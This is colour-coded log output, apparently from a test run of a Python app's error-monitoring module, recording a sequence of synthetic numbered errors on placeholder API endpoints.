WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 18'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 19'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684458Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 20'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684507Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 21'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 22'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 23'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684658Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 24'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684707Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 25'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684757Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 26'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 27'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684855Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 28'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 29'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685030Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 30'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685089Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 31'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 32'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 33'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685245Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 34'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685294Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 35'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 36'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685397Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 37'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685448Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 38'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 39'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685546Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 40'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685596Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 41'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 42'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 43'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 44'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 45'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685857Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 46'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 47'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.685961Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 48'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686012Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 49'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686062Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 50'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 51'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 52'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686257Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 53'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 54'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 55'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 56'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.686524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 57'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
